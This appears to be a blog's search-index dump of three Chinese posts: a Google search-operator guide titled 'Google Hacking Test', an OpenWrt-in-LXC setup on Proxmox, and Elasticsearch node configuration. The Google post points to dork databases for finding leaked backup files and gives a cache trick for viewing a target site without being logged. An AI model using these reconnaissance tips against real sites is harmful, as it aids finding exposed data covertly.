而基于括号这个操作，在搜索过程中就可以利用这个特性进行符合人类识别的分块构建查询，这个在于后面的布尔操作符和高级操作符上使用较多。\n布尔操作符 布尔操作符可以使用于基础搜索以及高级操作符，非常灵活，对于信息筛选的帮助非常大，主要为以下三种：\nAND操作符：该操作符用+表示添加在关键词前。和代码中的不一样，代码中表示的是两者都必须具备，而在Google中，代表的是多添加一个关键词进行搜索，所以这个操作符没有太大的意义，如搜索/北京 +故宫/和/北京 故宫/结果相差不大，这是因为Google本身就会将所有关键词放进搜索条件中进行搜索。\nNOT排除操作符：该操作符用-表示添加在关键词前，与字面意义一样，用于排除某个条件，如关键词返回的结果等，比如想了解/故宫/的信息，但不想看旅游相关的信息，如同程，那么就可以使用该操作符搜索/故宫 -同程/。\nOR操作符：该操作符用|表示添加在两个关键词之间，代表的意义为两个关键词匹配任意一个匹配网页的内容都可以返回，比如/北京|重庆 /，那么将返回北京或者重庆相关的页面。 OR操作符可以用于关键词的多选组合，比如查看北京的地铁规划，那么\u0026quot;地铁\u0026quot;一词可能也叫\u0026quot;轨道\u0026quot;，\u0026ldquo;规划\u0026quot;一词也可能叫\u0026quot;计划\u0026rdquo;，那么这个时候就可以通过OR操作符搜索/\u0026ldquo;北京 地铁|轨道 规划|计划\u0026rdquo;/（也可以利用括号进行分组，即/\u0026ldquo;北京 (地铁|轨道) (规划|计划)\u0026quot;/），那么Google将尝试组合“北京地铁计划”、“北京轨道计划”、“北京地铁规划”、“北京轨道规划”等关键词搜索。\n高级操作符 Google提供的搜索结果中，每条记录包含了六个部分，分别为标题、正文（简介）、URL、时间、缓存、文件类型，所有高级操作符也是围绕着这几个部分进行更为精细的控制，比如针对标题的搜索、正文的搜索、url的搜索等。 操作符有着严格的格式，高级操作符的语法为Operator:value，并且操作符、冒号、值之间不能有空格。如果不按照该格式，Google搜索将会把高级操作符当作关键词进行搜索，而查看自己是否有语法的错误，可以通过返回的结果中命中的红色关键词是否有异常，比如是否包含了高级操作符。 除此之外，前面精准搜索、布尔操作符都可以与高级操作符结合。\n标题类 标题类操作符为intitle和allintitle，用于搜索网页的标题，意味着你关键词的搜索范围仅限于标题。\nintitle：用于搜索单个词是否包含在标题中，比如搜索/intitle:\u0026ldquo;北京市\u0026rdquo;/，如果你要查询多个关键词用于搜索标题符合的网页，那么可以使用多个intitle或者使用allintitle。 allintitle：该高级操作符是会将后面所有的单词用于搜索标题，所以如intitle搜索标题中包含\u0026quot;北京市\u0026quot;和\u0026quot;故宫\u0026quot;的关键词，那么需要写两个intitle，而allintitle则只需要写一个/allintitle:\u0026ldquo;北京市\u0026rdquo; \u0026ldquo;故宫\u0026rdquo;/，但需要注意all开头的大部分高级操作符与其他操作符进行组合使用的时候会出现问题，所以如果你只是单独的搜索标题那么可以使用allintitle，而如果要与其他条件进行组合，那么建议使用intitle。 正文类 正文类操作符为intext和allintext，用于搜索网页的正文，意味着你的关键词的搜索范围仅限于正文/简介。\nintext：用于搜索单个词是否包含在正文中，比如搜索/intext:北京市/，如果你查询多个同样使用多个intext。 allintext：用于搜索正文中的多个词，同样与allintitle用法一样。 URL类 URL类用于搜索网址，涉及的高级操作符有4个，分为：\ninurl和allinurl：inurl和allinurl的使用方法和标题类、正文类一致。\nsite：site高级操作符用于搜索某个特定的域名或者域，比如只搜索微博关于故宫的信息，那么搜索语法为/site:weibo.com 故宫/。而搜索特定的域，则指的是com、cn、edu.cn等域名的后缀，如搜索所有的国内学校研究生招生的情况，则搜索语法为/site:edu.cn 研究生招生/。\ninanchor：inanchor高级操作符用于搜索超链接的文本。比如链接地址为weibo.com/xxx，而这个链接的文本则显示为“我的微博”，在html表示为\u0026lt;a href=\u0026quot;https://weibo.com/xxx\u0026quot;\u0026gt;我的微博\u0026lt;/a\u0026gt;，inanchor就是用于搜索这个链接文本“我的微博”。 该操作符搜索返回的结果并非是网页中是否包含，而是直接返回该链接，比如“我的微博”这个链接存放在我的主页，Google并不会返回我的主页作为结果，而是将\u0026quot;我的微博\u0026quot;这条链接直接作为结果。\n时间类 Google提供after和before用于搜索网页发布的时间，两个高级操作符的value格式为YYYY-MM-DD，两个操作符的value，只能单独设置年格式年或者完整日期格式年-月-日，而不能只提供年-月的格式。比如/北京市 before:2020-08/的2020-08就会作为关键词，而应该使用/北京市 before:2020-08-01/或者/北京市 before:2020/。 如果要限定时间范围，则可以同时使用after和before，但是需要注意同时使用，其中一个需要按照完整格式给出。如/北京市 after:2020 before:2021/就无法筛选时间，其他的时间结果也会存在结果当中，而应该使用/北京市 after:2020 before:2021-12-30/或者/北京市 after:2020-01-01 before:2021/。\n缓存类 Google搜索提供用于查看缓存的搜索语法cache，而这个语法不能与其他语法共用，并且语法规则也较为严格，需要输入完整的url，但是大部分的时候是不需要使用这个语法的，而是自己通过搜索结果后，进行查询，而对于没有缓存的页面则会直接返回错误的页面。 缓存中会提供三种版本，完整版、纯文字版、源代码，完整版是Google提供了文字信息，而对于动态加载的数据、图片等则是通过调用原始网页的信息，也就是说你除了和Google服务器进行请求，还可能会和原网站进行请求资源，纯文字版和源代码则只会与Google进行请求，在信息搜集等时候，可以利用该方法避免暴露自己的信息，同时已删除掉的部分网页也可以通过缓存获取到相关的信息。 避免暴露信息的方式使用可以先获取到搜索结构的连接，然后通过替换url字符串直接访问纯文字版本http://webcache.googleusercontent.com/search?q=cache:5YLkdysWgnIJ:替换为完整url\u0026amp;strip=1 来访问目标网址的缓存，比如访问 上面的链接中里面的strip=1代表直接访问纯文本，所以这样你就不需要打开缓存页面然后再选择纯文本版，这样就只会和google服务器请求数据，而不会被目标网站记录。\n文件类型操作符 Google搜索提供了一种以特定文件扩展名结尾的网页搜索语法filetype，这个语法可以方便我们去搜索像pdf/doc/xlsx等指定的文件后缀，这个功能在Google高级设置中能设置，但是高级搜索中仅仅只提供了部分的可选后缀，而通过语法你可以查询其他的特殊文件扩展名的网页，比如搜索包含故宫关键词的pdf文件/故宫 filetype:pdf/、搜索包含故宫的表格文件/故宫 filetype:xlsx/等。 但对于常用的文件类型Google会进行解析，但对于不太常用的文件类型Google则不会解析，常见 类型比如pdf类型即使不是网页pdf后缀，也能够识别出来，这是因为Google在抓去网页的时候会解析内容。比如/故宫 filetype:pdf -pdf/。 除此之外，https://filext.com/list/s 网站搜集了非常多的文件扩展名及用途。\n关键词监控工具 Google搜索提供了一个用于推送关键词监听的工具”google alert”，这个工具可以去更改推送频率、来源、语言等设置，而且搜索框中也支持Google的基础搜索、布尔、高级操作符，当新的结果显示在Google搜索结果中的时候，将会将新信息推送至你设置的邮箱当中。 这个工具对于关键词热度、舆情监控是非常有用的。\n参考资料 《Google Hacking 技术手册》 https://www.indeed.com/career-advice/finding-a-job/google-search-operators https://kinsta.com/blog/google-search-operators/ https://support.google.com/websearch/answer/2466433?hl=en\u0026amp;visit_id=638009788259931665-4261219002\u0026amp;rd=1 https://securitytrails.com/blog/google-hacking-techniques https://www.google.com/search/howsearchworks/how-search-works/ranking-results/ https://www.google.com/alerts# https://developers.google.com/search/docs/advanced/guidelines/webmaster-guidelines?hl=zh-cn ","permalink":"/posts/google-hacking-test/","summary":"前言 学习Google搜索，其目的是用于让自己得到更精准的信息，所以善用Google搜索对于信息收集、安全测试、查找答案等都有着非常大的帮助。而随着时间的变化Google对于语法的更新、规则都在改动，这些改动对于结果都有影响，所以使用前进行测试是非常有必要的。 查阅了诸多资料过后，将Google搜索的操作分为了三个等级，分别为基础搜索、布尔操作符、高级操作符，每个级别的都可以进行配合使用，有些组合起来能够让搜索更加精准，而有些则是不能进行组合。 同时这些搜索方式会与高级搜索设置中的功能重叠，但个人偏向使用语法对比高级搜索设置方便许多，所以后面的内容均使用语法，不会涉及到搜索设置等。 除此之外，还有诸多的网站可以获取到Google语法的途径，比如exploit-db是一个用于记录安全测试的Google语法数据库，这里面记录了非常多因配置失误操作的漏洞，如获取sql备份文件sql.bak等。Google Help提供常用的Google语法等。\n影响搜索的因素 Google在搜索原理的一篇简单的介绍了会影响搜索结果的几个因素，分别为以下7个因素：\n如果为中文，需要进行分词、语法等NLP技术的信息提取。\n查询理解，这个步骤典型的就是修正错别字，比如你搜索“贝京市”，那么算法会将关键词进行修正为“北京市”，所以返回的内容中也是“北京市”相关的内容。这个步骤我没有找到具体的文献，但和步骤1是有较强的联系。\n内容相关性，这个步骤典型的作用就是搜索网页中任何地方是否出现与关键词命中。\n内容质量，这个步骤用于确定网页是否具备权威、专业等，除了常见的网站认证、知名度、访问量等，还有Google的基于网页链接的算法，如PageRank，这种算法类似于投票，越权威的网站被引用/超链接的次数越多。基于这些情况然后进行排序，将这些高质量的网站靠前输出。\n网页可用性，这个步骤用于确定网页是否网页是否“优秀”，而Google是有一套公开的标准，典型的就是网页加载速度、适配各个访问的客户端、是否HTTPS、广告等。\n上下文设置，这个步骤和自己的历史数据、设置有关系，比如你的历史搜索中多次搜索了“巴塞罗那对阿森纳”，当你搜索“巴塞罗那”的时候，可能更加想访问的是“巴塞罗那球队”而不是“巴塞罗那地区”，该部分的影响，可以通过Google搜索主页右下角设置中的“您在Google搜索中的数据设置”删除，或者直接使用无痕模式搜索可以消除该影响。 除了这个，地区也会导致你的搜索结果会有影响，在Google右下角设置中的“搜索设置”里面的“区域设置”可以验证，比如将该设置更改为美国，你搜索\u0026quot;football\u0026quot;则是返回的NFL橄榄球职业比赛联盟，而如果将地区设置为英国，返回的则是足球。\n符号，在Google搜索中符号如（、。，/等都不会影响搜索结果，比如你搜索的是/中国北京/，那么结果中\u0026quot;中国（北京\u0026hellip;\u0026ldquo;这样的结果也会匹配。\n基础搜索 基础搜索是最常见的，里面包含了两种搜索方式：\n关键词查询：关键词查询就是最常用的方式，直接输入关键词查询或者给出多个以空格间隔的关键词，如/中国北京/或者/中国 北京/。但需要注意的是使用关键词查询，会尽可能的分词和理解你的意图（影响搜索的因素中的步骤一），并尽可能的返回有关的内容，那么如/中国北京/，就有可能包含/中国北京/、/中国/、/北京/等结果返回。\n准确查询：精确查询用双引号包裹一个或者多个关键词，与关键词查询不同之处在于精确查询并不会对关键词进行分词，而是原封不动的进行完整的匹配，所以你搜索/中国北京/，就有可能包含\u0026quot;中国北京\u0026rdquo;、\u0026ldquo;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。而搜索/\u0026ldquo;中国北京\u0026rdquo;/，则代表每一个结果都按照\u0026quot;中国北京\u0026quot;这个词进行完整的匹配，不会出现\u0026quot;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。 而如果精确搜索给出了多个关键词，如/\u0026ldquo;中国 北京\u0026rdquo;/，则这个中间的空格代表着顺序，说所以可以理解为查询的含义为在\u0026quot;中国\u0026quot;这个词后紧跟着\u0026quot;北京\u0026quot;这个关键词。\n除了这两种搜索之外，还包含了几个符号：\n通配符：通配符*与程序中的通配符意义不一样，中文和英文搜索中这里的通配符代表的是一个词，比如/\u0026ldquo;北京市 故宫\u0026rdquo;/，将“京”替换为*，也就是/\u0026ldquo;北*市 故宫\u0026rdquo;/搜索，那么返回的结果中可能包含着如“北厦门市故宫”、\u0026ldquo;北秋田市故宮\u0026quot;等结果。如果将搜索改为/\u0026rdquo;*市 故宫\u0026rdquo;/，那么你看见命中的关键词（红色标注）则为“太保市故宮”、“北京市故宫”等词。所以这说明通配符匹配的是一个词，而不是一个字，作用是尽可能的将一个词与前后的关键字进行组合成一个完整的词。\n单字任意符：这个符号对于中文不太友好，中文下呈现的大多数能匹配到标点符号，而代表任意中文字符则不行，如搜索\u0026quot;湖北省\u0026quot;、\u0026ldquo;湖南省\u0026quot;等相关信息，所以语法为/\u0026ldquo;湖*省\u0026rdquo;/，但是返回的则是\u0026quot;湖省\u0026quot;和\u0026quot;湖（省\u0026rdquo;。 而对于英文则是能替代任意字符，比如/\u0026ldquo;hac*ing\u0026rdquo;/，则能搜索到\u0026quot;hacking\u0026quot;等结果。\n括号：Google搜索中对于括号是不敏感的，所以如 /北京(（市/ 搜索中放置了一个中文一个英文的括号，都会正常返回“北京市”结果，而在精确操作中同样适用，即/\u0026ldquo;北京(（市\u0026rdquo;/也能正确返回“北京市”的结果。 而基于括号这个操作，在搜索过程中就可以利用这个特性进行符合人类识别的分块构建查询，这个在于后面的布尔操作符和高级操作符上使用较多。\n布尔操作符 布尔操作符可以使用于基础搜索以及高级操作符，非常灵活，对于信息筛选的帮助非常大，主要为以下三种：\nAND操作符：该操作符用+表示添加在关键词前。和代码中的不一样，代码中表示的是两者都必须具备，而在Google中，代表的是多添加一个关键词进行搜索，所以这个操作符没有太大的意义，如搜索/北京 +故宫/和/北京 故宫/结果相差不大，这是因为Google本身就会将所有关键词放进搜索条件中进行搜索。\nNOT排除操作符：该操作符用-表示添加在关键词前，与字面意义一样，用于排除某个条件，如关键词返回的结果等，比如想了解/故宫/的信息，但不想看旅游相关的信息，如同程，那么就可以使用该操作符搜索/故宫 -同程/。\nOR操作符：该操作符用|表示添加在两个关键词之间，代表的意义为两个关键词匹配任意一个匹配网页的内容都可以返回，比如/北京|重庆 /，那么将返回北京或者重庆相关的页面。 OR操作符可以用于关键词的多选组合，比如查看北京的地铁规划，那么\u0026quot;地铁\u0026quot;一词可能也叫\u0026quot;轨道\u0026quot;，\u0026ldquo;规划\u0026quot;一词也可能叫\u0026quot;计划\u0026rdquo;，那么这个时候就可以通过OR操作符搜索/\u0026ldquo;北京 地铁|轨道 规划|计划\u0026rdquo;/（也可以利用括号进行分组，即/\u0026ldquo;北京 (地铁|轨道) (规划|计划)\u0026quot;/），那么Google将尝试组合“北京地铁计划”、“北京轨道计划”、“北京地铁规划”、“北京轨道规划”等关键词搜索。\n高级操作符 Google提供的搜索结果中，每条记录包含了六个部分，分别为标题、正文（简介）、URL、时间、缓存、文件类型，所有高级操作符也是围绕着这几个部分进行更为精细的控制，比如针对标题的搜索、正文的搜索、url的搜索等。 操作符有着严格的格式，高级操作符的语法为Operator:value，并且操作符、冒号、值之间不能有空格。如果不按照该格式，Google搜索将会把高级操作符当作关键词进行搜索，而查看自己是否有语法的错误，可以通过返回的结果中命中的红色关键词是否有异常，比如是否包含了高级操作符。 除此之外，前面精准搜索、布尔操作符都可以与高级操作符结合。\n标题类 标题类操作符为intitle和allintitle，用于搜索网页的标题，意味着你关键词的搜索范围仅限于标题。\nintitle：用于搜索单个词是否包含在标题中，比如搜索/intitle:\u0026ldquo;北京市\u0026rdquo;/，如果你要查询多个关键词用于搜索标题符合的网页，那么可以使用多个intitle或者使用allintitle。 allintitle：该高级操作符是会将后面所有的单词用于搜索标题，所以如intitle搜索标题中包含\u0026quot;北京市\u0026quot;和\u0026quot;故宫\u0026quot;的关键词，那么需要写两个intitle，而allintitle则只需要写一个/allintitle:\u0026ldquo;北京市\u0026rdquo; \u0026ldquo;故宫\u0026rdquo;/，但需要注意all开头的大部分高级操作符与其他操作符进行组合使用的时候会出现问题，所以如果你只是单独的搜索标题那么可以使用allintitle，而如果要与其他条件进行组合，那么建议使用intitle。 正文类 正文类操作符为intext和allintext，用于搜索网页的正文，意味着你的关键词的搜索范围仅限于正文/简介。\nintext：用于搜索单个词是否包含在正文中，比如搜索/intext:北京市/，如果你查询多个同样使用多个intext。 allintext：用于搜索正文中的多个词，同样与allintitle用法一样。 URL类 URL类用于搜索网址，涉及的高级操作符有4个，分为：\ninurl和allinurl：inurl和allinurl的使用方法和标题类、正文类一致。\nsite：site高级操作符用于搜索某个特定的域名或者域，比如只搜索微博关于故宫的信息，那么搜索语法为/site:weibo.com 故宫/。而搜索特定的域，则指的是com、cn、edu.cn等域名的后缀，如搜索所有的国内学校研究生招生的情况，则搜索语法为/site:edu.cn 研究生招生/。\ninanchor：inanchor高级操作符用于搜索超链接的文本。比如链接地址为weibo.com/xxx，而这个链接的文本则显示为“我的微博”，在html表示为\u0026lt;a href=\u0026quot;https://weibo.com/xxx\u0026quot;\u0026gt;我的微博\u0026lt;/a\u0026gt;，inanchor就是用于搜索这个链接文本“我的微博”。 该操作符搜索返回的结果并非是网页中是否包含，而是直接返回该链接，比如“我的微博”这个链接存放在我的主页，Google并不会返回我的主页作为结果，而是将\u0026quot;我的微博\u0026quot;这条链接直接作为结果。","title":"Google Hacking Test"},{"content":"前期工作 环境和机器配置：\n机器：5105v4 i226-v版本\npve： 7.1.2，内核Linux 5.13.19-2-pve\n准备工作：\n将网线连接到pve管理口，如果已安装openwrt，然后关闭原openwrt虚拟机，删除直通的网卡。\n准备一份没有引导的openwrt固件包，可以是img也可以是tar.gz，但一定是没有引导的包，可以看文件名中包含rootfs字符，比如openwrt-x86-64-generic-ext4-rootfs.img或openwrt-21.02.0-x86-64-rootfs.tar.gz（前者是我自己编译的，重点在于rootfs）。\nPVE直通配置 连接到PVE，输入命令：\nnano /etc/default/grub 找到下面这一行：\nGRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;quiet\u0026#34; 然后添加\u0026quot;intel_iommu=on\u0026quot;，这是英特尔的直通配置，AMD需要自行查找配置命令：\nGRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;quiet intel_iommu=on\u0026#34; 然后更新引导：\nupdate-grub 修改nano /etc/modules内核模块文件，添加直通的驱动，让系统启动的时候载入这些驱动：\nvfio vfio_iommu_type1 vfio_pci vfio_virqfd 执行命令来更新内核：\nupdate-initramfs -u -k all. 创建基础环境文件包 tar.gz格式 如果包后缀为tar.gz，则通过scp直接上传至pve，以下[]内的字符根据自己情况进行替换（包括[和]符号），然后跳至下一章节：\nscp [固件路径.tar.gz] root@[pveIP地址]:/var/lib/vz/template/cache img格式 上传固件：\nscp [固件路径.img] root@[pveIP地址]:/root 这里需要注意，如果你的固件包是带squashfs字符，比如openwrt-x86-64-generic-squashfs-rootfs.img，你需要按照下面的方式进行解压。 安装解压包：\napt install squashfs-tools 解压镜像文件：\nunsquashfs [固件路径.img] 解压完成后你在同级目录下会得到squashfs-root文件夹，然后进入该文件夹，跳至3步骤。 如果你是不带squashfs字符，比如openwrt-x86-64-generic-ext4-rootfs.img，则需要通过挂载镜像，得到内部文件，首先创建一个挂载点（下面操作在root目录中进行）：\nmkdir op 然后挂载镜像：\nmount -t ext4 -o loop [固件路径.img] /root/op 然后进入/root/op，跳至3步骤（完成后，通过使用umount /root/op进行卸载镜像）。\n打包为pve的CT模板包： 进入上述2步骤中得到的文件夹中，然后使用下列命令进行打包，得到的文件下文称为op-ct模版：\ntar zcf /var/lib/vz/template/cache/[固件名称].tar.gz ./* 创建容器 准备工作做完后，就开始创建lxc容器，通过下列命令进行创建：\npct create 110 local:vztmpl/openwrt-x86-64-generic-ext4-rootfs.tar.gz --rootfs local-lvm:2 --ostype unmanaged --hostname openwrt-ct --arch amd64 --cores 2 --memory 1024 --swap 0 -net0 bridge=vmbr0,name=eth0 这里详细说明一下每个参数的意思，使用的时候需要根据自己的情况进行更改：\npct create：容器创建命令 110：容器ID，可根据自己情况设定 local:vztmpl/openwrt-x86-64-generic-ext4-rootfs.tar.gz： 为第三步骤所得到的固件包名称 --rootfs：模版为rootfs文件 local-lvm:2 ：后面的数字代表分配的磁盘大小，比如我这里设置的为2，即为即将创建的容器分配2G的大小 --ostype unmanaged：操作系统类型，这里没有填写指定的操作系统（不会影响） --hostname openwrt-ct：主机名，也就是虚拟机名称 --arch amd64：设置为64位 --cores 2：分配给容器的核心数（我不知道这里是不是和docker一样，为最大限制） --memory 1024：分配给容器最大的内存数量 --swap 0：交换分区设置为0 -net0 bridge=vmbr0,name=eth0：网卡，这里一定要设置，不然你的op没有办法连接到pve的虚拟交换机。 按照上述命令执行完成后，应该会得到如下的内容：\nroot@pve:/var/lib/vz/template/cache# pct create 110 local:vztmpl/openwrt-x86-64-generic-ext4-rootfs.tar.gz --rootfs local-lvm:2 --ostype unmanaged --hostname openwrt-ct --arch amd64 --cores 2 --memory 1024 --swap 0 -net0 bridge=vmbr0,name=eth0 Logical volume \u0026#34;vm-110-disk-0\u0026#34; created. Creating filesystem with 524288 4k blocks and 131072 inodes Filesystem UUID: 15d6753a-ceb2-45d3-9dca-903f97f0f197 Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912 extracting archive \u0026#39;/var/lib/vz/template/cache/openwrt-x86-64-generic-ext4-rootfs.tar.gz\u0026#39; Total bytes read: 143063040 (137MiB, 86MiB/s) 网卡直通 编辑lxc容器的配置文件，进行网卡直通： vim /etc/pve/lxc/[容器ID].conf 在最下面添加以下内容：\n# openwrt.common.conf是PVE自带的openwrt配置文件示例，内含一些基本设置 lxc.include: /usr/share/lxc/config/openwrt.common.conf # /dev/ppp pppoe拨号等功能需要用到 lxc.cgroup.devices.allow: c 108:0 rwm # 钩子脚本，用于添加 /dev/ppp等设备 hookscript: local:snippets/hookscript.pl # 这里是网卡直通重要的部分。 lxc.net.1.type: phys lxc.net.1.link: enp3s0 lxc.net.1.flags: up lxc.net.2.type: phys lxc.net.2.link: enp4s0 lxc.net.2.flags: up lxc.net.3.type: phys lxc.net.3.link: enp5s0 lxc.net.3.flags: up 需要注意，网卡直通部分里面的网卡名字，需要根据pve控制面板选择【pve】-【系统】-【网络】中查看，其中一定避免管理口，我这里是enp2s0为管理口，所以没有直通，而是在启动容器的时候，作为桥接接进来了。我的软路由为5105四口，所以这里排除了管理口，我直通了2-4网口。 除此之外，lxc.cgroup.devices.allow: c 108:0 rwm为ppp字符设备的主次设备编号，其中108为ppp设备主编号，0为设备次编号，获取这个编号可以通过ls -al /dev/ppp获取，大致返回如下的内容。\nroot@pve:~# ls -al /dev/ppp crw------- 1 root root 108, 0 Sep 9 21:07 /dev/ppp 创建pve容器启动时的钩子脚本，用于配置ppp设备的添加等。 mkdir /var/lib/vz/snippets cp /usr/share/pve-docs/examples/guest-example-hookscript.pl /var/lib/vz/snippets/hookscript.pl vim /var/lib/vz/snippets/hookscript.pl 然后修改内容：\n在第36行可以找到以下内容 # Second phase \u0026#39;post-start\u0026#39; will be executed after the guest # successfully started. print \u0026#34;$vmid started successfully.\\n\u0026#34;; 修改为 # Second phase \u0026#39;post-start\u0026#39; will be executed after the guest # successfully started. system(\u0026#34;lxc-device add -n $vmid /dev/ppp\u0026#34;); system(\u0026#34;lxc-device add -n $vmid /dev/net/tun\u0026#34;); print \u0026#34;$vmid started successfully.\\n\u0026#34;; 设置防火墙 在pve管理界面，选择创建的容器，然后切换至防火墙页面，点击添加，然后添加两次，每次只需要改动方向in和out和勾选启用。按照下面的教程中，设置端口好像报错，但不设置设备接入后又无法联网，但这样添加后，即可联网。\n重启 重启整个pve，如果不重启直接启动容器，这个网卡会提示找不到，具体原因暂不知道。重启后，即可启动容器，按照正常的openwrt配置即可。\n其他 这里配置openwrt的时候需要注意，因为网卡是直通的，所以网卡名可能和虚拟机不一样，虚拟机中是eth0-3，而在容器里面，除了指定的eth0（管理口，也是网口1），剩余的网口名称为enp3s0、enp4s0、enp5s0，也就是对应的2、3、4口（我的环境下），所以根据自身情况选择对应的网口分配wan和lan口进行。 在设置完wan口和防火墙后，openwrt拨号设置后，你需要重启pve，才能生效。我猜测这是因为拨号配置是挂载的pve的，所以pve将配置文件载入到内存中，即使重启容器也还是从pve内存中读，应该有其他方法在pve中重载入配置文件，但目前我没有找到。 参考 https://www.right.com.cn/forum/thread-8218119-1-1.html https://blog.csdn.net/kangzeru/article/details/115373587 https://4xu.net/posts/koolshare-2.html/ https://pvecli.xuan2host.com/lxc-network-bypass/ https://39.108.190.212/archives/42.html ","permalink":"/posts/lxc-openwrt/","summary":"前期工作 环境和机器配置：\n机器：5105v4 i226-v版本\npve： 7.1.2，内核Linux 5.13.19-2-pve\n准备工作：\n将网线连接到pve管理口，如果已安装openwrt，然后关闭原openwrt虚拟机，删除直通的网卡。\n准备一份没有引导的openwrt固件包，可以是img也可以是tar.gz，但一定是没有引导的包，可以看文件名中包含rootfs字符，比如openwrt-x86-64-generic-ext4-rootfs.img或openwrt-21.02.0-x86-64-rootfs.tar.gz（前者是我自己编译的，重点在于rootfs）。\nPVE直通配置 连接到PVE，输入命令：\nnano /etc/default/grub 找到下面这一行：\nGRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;quiet\u0026#34; 然后添加\u0026quot;intel_iommu=on\u0026quot;，这是英特尔的直通配置，AMD需要自行查找配置命令：\nGRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;quiet intel_iommu=on\u0026#34; 然后更新引导：\nupdate-grub 修改nano /etc/modules内核模块文件，添加直通的驱动，让系统启动的时候载入这些驱动：\nvfio vfio_iommu_type1 vfio_pci vfio_virqfd 执行命令来更新内核：\nupdate-initramfs -u -k all. 创建基础环境文件包 tar.gz格式 如果包后缀为tar.gz，则通过scp直接上传至pve，以下[]内的字符根据自己情况进行替换（包括[和]符号），然后跳至下一章节：\nscp [固件路径.tar.gz] root@[pveIP地址]:/var/lib/vz/template/cache img格式 上传固件：\nscp [固件路径.img] root@[pveIP地址]:/root 这里需要注意，如果你的固件包是带squashfs字符，比如openwrt-x86-64-generic-squashfs-rootfs.img，你需要按照下面的方式进行解压。 安装解压包：\napt install squashfs-tools 解压镜像文件：\nunsquashfs [固件路径.img] 解压完成后你在同级目录下会得到squashfs-root文件夹，然后进入该文件夹，跳至3步骤。 如果你是不带squashfs字符，比如openwrt-x86-64-generic-ext4-rootfs.img，则需要通过挂载镜像，得到内部文件，首先创建一个挂载点（下面操作在root目录中进行）：\nmkdir op 然后挂载镜像：\nmount -t ext4 -o loop [固件路径.img] /root/op 然后进入/root/op，跳至3步骤（完成后，通过使用umount /root/op进行卸载镜像）。\n打包为pve的CT模板包： 进入上述2步骤中得到的文件夹中，然后使用下列命令进行打包，得到的文件下文称为op-ct模版：\ntar zcf /var/lib/vz/template/cache/[固件名称].tar.gz .","title":"基于LXC容器的Openwrt搭建"},{"content":"节点配置 配置Java 因为Elasticsearch是Java编写的，所以在使用Elasticsearch之前，需要构建好Java的环境。而Elasticsearch会在每个发行版中包含一个推荐JVM版本。同时官方也推荐使用捆绑的JVM版本。 所以有两种方式来配置JVM：\n使用捆绑JVM 手动安装适配当前Elasticsearch的JVM版本 如果是通过下载解压包，则解压后会在第一层目录中看见一个名为jdk的目录，这个就是自带的推荐JVM，默认情况下，如果环境中没有设置ES_JAVA_HOME在启动的时候，则会直接使用自带的JVM。 如果安装了JVM，但需要使用自带JVM或者使用指定的JVM，则可以找到esdir/bin/Elasticsearch-env文件，然后找到下面的内容：\n# now set the path to java ES_JAVA_HOME=\u0026#34;/home/elastic/Elasticsearch-8.2.0/jdk\u0026#34; # 添加这段内容，路径需要自行修改 if [ ! -z \u0026#34;$ES_JAVA_HOME\u0026#34; ]; then JAVA=\u0026#34;$ES_JAVA_HOME/bin/java\u0026#34; JAVA_TYPE=\u0026#34;ES_JAVA_HOME\u0026#34; Java堆内存配置 Elasticsearch使用Java编写的，所以Java的堆内存越大，Elasticsearch可用的堆内存越多，缓存的数据也就越多。但是过于太大的堆内存，可能是垃圾回收暂停。 除此之外，官方还建议堆内存的大小设置不要超过对象指针（oops）的阈值。不同的系统阈值有所不同，而在大多数系统上26GB是安全，而有些可能可用高达30G。 查看是否超过了oops阈值，可用两种方法。第一种为API：\n_nodes/_all/jvm { ... \u0026#34;using_compressed_ordinary_object_pointers\u0026#34;: \u0026#34;true\u0026#34;, ... } 第二种为检查日志：\n[2022-06-09T06:17:15,837][INFO ][o.e.e.NodeEnvironment ] [xxx-p1] heap size [28gb], compressed ordinary object pointers [true] 设置堆内存大小通过设置Elasticsearch配置文件中的jvm.options文件，但在生产环境中尽量不要使用该文件直接修改，而是在java.options.d目录中新添加一个后缀为.options的文件。 配置文件中通过-Xms和-Xmx来设置最小和最大的堆内存：\nesdir/config/jvm.options.d/heap.options -Xms16g -Xmx16g 官方建议将该值设置为一致的，并且该值应该小于物理内存的50%。因为除了堆内存，JVM本身也需要一定的内存，除此之外，Elasticsearch底层使用的Lucence，Lucence段存放在单独的文件中，而OS会将部分常用段进行缓存（热段），便于加快应用的访问性能，所以没有足够的内存给OS进行缓存，那么同样会降低Elasticsearch的性能。 下面是因为堆内存设置过大，导致JVM内存不够的报错：\nException in thread \u0026#34;main\u0026#34; java.lang.RuntimeException: starting java failed with [1] output: # # There is insufficient memory for the Java Runtime Environment to continue. # Native memory allocation (mmap) failed to map 33285996544 bytes for committing reserved memory. # An error report file with more information is saved as: # logs/hs_err_pid13775.log error: OpenJDK 64-Bit Server VM warning: INFO: os::commit_memory(0x0000001001000000, 33285996544, 0) failed; error=\u0026#39;Not enough space\u0026#39; (errno=12) at org.Elasticsearch.tools.launchers.JvmOption.flagsFinal(JvmOption.java:114) at org.Elasticsearch.tools.launchers.JvmOption.findFinalOptions(JvmOption.java:79) at org.Elasticsearch.tools.launchers.MachineDependentHeap.determineHeapSettings(MachineDependentHeap.java:61) at org.Elasticsearch.tools.launchers.JvmOptionsParser.jvmOptions(JvmOptionsParser.java:135) at org.Elasticsearch.tools.launchers.JvmOptionsParser.main(JvmOptionsParser.java:87) 数据、日志、临时文件存放配置 Elasticsearch默认将索引的数据写入Elasticsearch主目录下的data目录，而集群和操作相关的日志则写入Elasticsearch主目录下的logs目录。而这些目录在Elasticsearch升级的过程中可能会造成丢失或者删除。 所以在配置文件中config/Elasticsearch.yml设置path.data和path.logs来设置指定存放路径尤为重要。 比如下面的目录则设置了将数据存放在/var/es-data和/var/es-logs。\n... path.data: /var/es-data path.logs: /var/es-logs ... 同时Elasticsearch在启动的时候会在系统的临时目录下创建私有的临时目录，而某些Linux的发行中的系统程序会删除掉临时目录/tmp中最近未访问的文件和目录，如果Elasticsearch长时间不使用私有的临时目录，那么将被系统可能删除掉，进而引发Elasticsearch的错误。 